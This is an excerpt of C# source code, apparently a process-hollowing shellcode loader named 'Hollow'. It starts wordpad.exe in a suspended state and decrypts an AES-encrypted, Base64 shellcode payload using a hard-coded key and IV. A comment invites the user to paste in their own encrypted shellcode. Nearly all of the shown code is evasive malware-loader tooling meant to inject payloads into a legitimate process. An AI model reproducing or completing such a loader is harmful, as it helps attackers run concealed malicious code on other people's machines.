...
namespace Hollow
{
    class Program
    {
        ...
        public static void herewego()
        {
            ...
            bool succ = CreateProcess(null, "C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe", ref lpa, ref lta, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            if (succ)
            {
        ...
        // Please replace the encrypted shellcode, including AES KEY, AES IV, AES + Base64 payload
        static byte[] buf()
        {
            string pb = "";
            string aeskey = "y31pr7sb8t65G4nM6IwVtXSZA61Ivw7bJHVf4M355CNO2hO7J3R22B9djuCdGqPL";
            string aesiv = "pR4t0H86Lk0imYNmcZBSK9fJxa3LFyUxmUHzJQoOFgFg3OGs99ZeP2QkLKpwc6AM";
            byte[] sc = AESDecrypt.Decrypt(aeskey, pb, aesiv);
    ...
    {
        public static byte[] subiv(byte[] a, int length)
        {
        ...
        public static byte[] Decrypt(string key, string aes_base64, string iv)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            byte[] tempIV = Encoding.ASCII.GetBytes(iv);

            tempKey = SHA256.Create().ComputeHash(tempKey);
            tempIV = SHA256.Create().ComputeHash(tempIV);
            ...
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, subiv(tempIV, 16));
